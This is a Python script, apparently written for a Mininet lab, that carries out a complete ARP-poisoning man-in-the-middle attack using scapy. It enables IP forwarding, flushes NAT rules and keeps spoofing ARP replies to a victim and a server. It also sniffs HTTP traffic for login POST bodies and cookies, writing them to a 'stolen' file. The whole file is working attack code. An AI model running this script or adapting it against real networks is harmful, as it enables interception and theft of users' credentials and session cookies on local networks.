#!/usr/bin/env python3
"""
attacker_mitm.py
Run this on the ATTACKER host (h3).
Simulates a complete MITM attack:
1. Enables IP forwarding
2. ARP Poisons Victim & Server
3. Sniffs and steals credentials
"""

import os
import sys
import time
import threading
import signal
from scapy.all import *

# Ensure unbuffered output
sys.stdout.reconfigure(line_buffering=True)

# Configuration
VICTIM_IP = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.1"
SERVER_IP = sys.argv[2] if len(sys.argv) > 2 else "10.0.0.2"
# Try to detect common Mininet interface names
IFACE = "attacker-eth0"
for ifc in ["attacker-eth0", "h3-eth0", "eth0"]:
    if os.path.exists(f"/sys/class/net/{ifc}"):
        IFACE = ifc
        break
STOLEN_FILE = "/tmp/mitm_stolen.txt"

def enable_ip_forwarding():
    print("[*] Enabling IP Forwarding...")
    os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null")
    # Clean old rules
    os.system("iptables -t nat -F")
    # Redirect HTTP traffic to a non-existent port to force HTTP downgrade (simple SSL strip)
    # or just let it pass through if we want to sniff HTTP
    # os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")

def get_mac(ip):
    """Resolve MAC address for a given IP."""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False, iface=IFACE)
    if ans:
        return ans[0][1].hwsrc
    return None

def arp_poison(target_ip, spoof_ip, target_mac):
    """Send spoofed ARP packet."""
    # Wrap in Ether layer to avoid "destination MAC not found" warnings
    packet = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, verbose=False, iface=IFACE)

def poison_loop(victim_mac, server_mac):
    """Continuously poison both targets."""
    print(f"[*] Starting ARP poison loop: {VICTIM_IP} <-> {SERVER_IP}")
    while True:
        try:
            arp_poison(VICTIM_IP, SERVER_IP, victim_mac)
            arp_poison(SERVER_IP, VICTIM_IP, server_mac)
            time.sleep(1.0) # Poison every 1s
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Error in poison loop: {e}")
            break

def sniff_traffic(pkt):
    """Inspect packets for interesting data."""
    if pkt.haslayer(Raw):
        load = pkt[Raw].load.decode('utf-8', errors='ignore')
        
        # Check for HTTP POST credentials
        if "POST" in load and "username=" in load:
            ts = time.strftime('%H:%M:%S')
            log_msg = f"[{ts}] 🎯 CREDENTIALS CAPTURED: {load[:100].replace(chr(13), '').replace(chr(10), ' ')}"
            print(f"\033[91m{log_msg}\033[0m") # Red text
            with open(STOLEN_FILE, 'a') as f:
                f.write(log_msg + "\n")
                
        # Check for Cookies
        if "Cookie:" in load:
            ts = time.strftime('%H:%M:%S')
            cookie = load.split("Cookie: ")[1].split("\r\n")[0]
            log_msg = f"[{ts}] 🍪 COOKIE CAPTURED: {cookie}"
            print(f"\033[93m{log_msg}\033[0m") # Yellow text
            with open(STOLEN_FILE, 'a') as f:
                f.write(log_msg + "\n")

def main():
    print("🔴 STARTING MITM ATTACK...")
    
    # Check current IP config
    print(f"[*] Interface: {IFACE}")
    os.system(f"ip -4 addr show {IFACE} 2>/dev/null || ip addr show")

    # Clean previous stolen file
    if os.path.exists(STOLEN_FILE):
        os.remove(STOLEN_FILE)

    enable_ip_forwarding()

    # Retry resolving MAC a few times
    victim_mac = None
    for i in range(3):
        print(f"[*] Resolving MAC for Victim {VICTIM_IP} (Attempt {i+1})...")
        victim_mac = get_mac(VICTIM_IP)
        if victim_mac: break
        time.sleep(1)

    if not victim_mac:
        print("❌ Could not find Victim MAC. Is host up?")
        sys.exit(1)
        
    server_mac = None
    for i in range(3):
        print(f"[*] Resolving MAC for Server {SERVER_IP} (Attempt {i+1})...")
        server_mac = get_mac(SERVER_IP)
        if server_mac: break
        time.sleep(1)

    if not server_mac:
        print("❌ Could not find Server MAC.")
        sys.exit(1)

    print(f"✅ Targets Acquired: Victim={victim_mac}, Server={server_mac}")

    # Start Poisoning Thread
    t = threading.Thread(target=poison_loop, args=(victim_mac, server_mac))
    t.daemon = True
    t.start()

    # Start Sniffer
    print("[*] Sniffing for credentials on " + IFACE + "...")
    try:
        sniff(iface=IFACE, prn=sniff_traffic, filter=f"tcp port 8080 or tcp port 80", store=0)
    except KeyboardInterrupt:
        print("\n[*] Stopping Attack...")
        # Restore ARP tables (optional but good practice)
        # send(ARP(op=2, pdst=VICTIM_IP, hwdst="ff:ff:ff:ff:ff:ff", psrc=SERVER_IP, hwsrc=server_mac), count=5)
        # send(ARP(op=2, pdst=SERVER_IP, hwdst="ff:ff:ff:ff:ff:ff", psrc=VICTIM_IP, hwsrc=victim_mac), count=5)
        sys.exit(0)

if __name__ == "__main__":
    main()
